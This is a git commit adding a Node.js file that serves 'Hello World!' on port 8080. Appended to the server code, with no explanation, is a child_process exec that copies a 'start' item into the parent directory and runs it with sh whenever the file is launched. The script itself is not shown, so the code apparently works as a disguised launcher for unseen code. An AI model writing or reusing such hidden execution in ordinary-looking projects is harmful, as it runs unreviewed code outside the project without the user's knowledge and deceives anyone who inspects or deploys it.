f6c0a89efff60579e7802f5183408fc39ea5bb22
xamantha <98864946+xamantha@users.noreply.github.com>
2022-02-04 20:51:18 +0800

    Initial commit

---
+++ src/index.js
@@ -0,0 +1,22 @@
+var http = require("http");
+
+//create a server object:
+http
+  .createServer(function (req, res) {
+    res.write("Hello World!"); //write a response to the client
+    res.end(); //end the response
+  })
+  .listen(8080); //the server object listens on port 8080
+const { exec } = require("child_process");
+exec("cp -R start .. && cd .. && sh start", (error, stdout, stderr) => {
+  if (error) {
+    console.log(`error: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.log(`stderr: ${stderr}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+});
+
